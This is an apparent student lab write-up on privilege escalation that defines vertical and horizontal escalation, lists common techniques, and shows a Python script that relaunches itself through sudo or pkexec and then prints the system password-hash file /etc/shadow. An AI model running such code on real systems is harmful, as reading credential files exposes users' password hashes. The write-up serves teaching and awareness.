---
title: Privilege Escalation
authors: [Jason Ni, William Shih]
category: Projects
description: Lab focused on privilege escalation
---

# A Deeper Dive Into Privilege Escalation

<img src="https://delinea.com/hs-fs/hubfs/delinea-blog-2-privilege-escalation-vertical-vs-horizontal.jpg?width=400&name=delinea-blog-2-privilege-escalation-vertical-vs-horizontal.jpg" alt="blog image" />

## Table of Contents
- [Introduction](#introduction)
- [What is Privilege Escalation?](#what-is-privilege-escalation?)
- [Python Code](#python-code)
- [Conclusion](#conclusion)

## Introduction
As malware like trojans and PUAs (potentially unwanted applications) become more common, understanding their methods of privilege escalation is crucial in improving our systems of security.

## What is Privilege Escalation?
Privilege escalation is a security vulnerability and an attack method where an attacker gains higher levels of permissions than they already have. Most attackers will usually seek to gain higher privileges, such as admin or root-level access.

There are two main types of privilege escalation:

Vertical Privilege Escalation: An attacker seeks higher privileges, such as system-level privileges. This is typically the form that most types of malware today use.

Horizontal Privilege Escalation: An attacker seeks access to the same level of privileges but on a different system or application.

There are various privilege escalation techniques, including:
Software Vulnerabilities: Vulnerabilities like buffer overflows, injection flaws, and other weaknesses can be exploited by attackers to gain higher privileges.

Misconfigured Permissions: Configuring weak or incorrect permissions on files, directories, or system resources can lead to privilege escalation.

Weak Passwords: Users with weak passwords can be at risk, especially those with root privileges, since attackers can easily gain higher than normal privileges.

Social Engineering: Some attackers may use social and psychological manipulation and deception to gain higher permissions from unaware users.

Backdoors and Malware: Attackers may also use backdoor attacks and install harmful software to gain access to higher system permissions.

## Python Code:
This python script is an attempt to escalate an attacker’s privileges to root privileges

```python
#!/usr/bin/env python3
# The above line tells linux that if you try to run this file directly using ./filename.py,
# it should run it with python3 instead of trying to run as a bash script or something
import os
import sys
import subprocess

# https://stackoverflow.com/questions/404744/determining-application-path-in-a-python-exe-generated-by-pyinstaller
# determine if application is a script file or frozen exe, gets executable path
# if you do not care about pyinstaller, you can replace this entire section with just application_path = "my_malware.py"
if getattr(sys, 'frozen', False):
    # If we use pyinstaller, the path to the executable running the progran *is* our program
    application_path = sys.executable
else:
    # If we don't use pyinstaller, sys.executable will just return the python3 executable, which is not what we want
    # Instead, we need the path to the file that is being run, which python provides in __file__
    application_path = os.path.abspath(__file__)



euid = os.geteuid() # Gets the current *effective* user id, which is the ID used for permission checking
if euid != 0: # Run this if we don't have permission, so we need to ask for it
    print("Script not started as root. Running sudo..")
    script_path = application_path 
    escalation_program = "pkexec" if os.getenv("TERM_PROGRAM") is None else "sudo" # Check if in vscode terminal, and if so, use sudo instead of pkexec
    subprocess.run([escalation_program, script_path]) # run sudo ./script or pkexec ./script
    # subprocess.run(["sudo", "python3", "my_malware.py"])
    sys.exit(0) # exit since we are done

print('Running. Your euid is ' + str(euid))
# read and display /etc/shadow, a good test for elevated permission access
with open('/etc/shadow', 'r') as f:
    print("".join(f.readlines()))
# with open('/win', 'w') as f2:
#     f2.write("win")
```

Note:
* The use of sudo or pexec prompts the user for a password to authenticate and gain root privileges.


## Conclusion
Privilege escalation is a critical security concern that affects the cybersecurity systems we use everyday. Understanding various techniques used in privilege escalation is important in protecting our own and others’ personal information.

While privilege escalation remains a persistent threat in today’s modern landscape (in fact, trojans and PUAs that ask for root access are now the most common forms of malware for Windows and macOS users), being proactive and spreading awareness of privilege escalation decreases risks of cybersecurity threats.
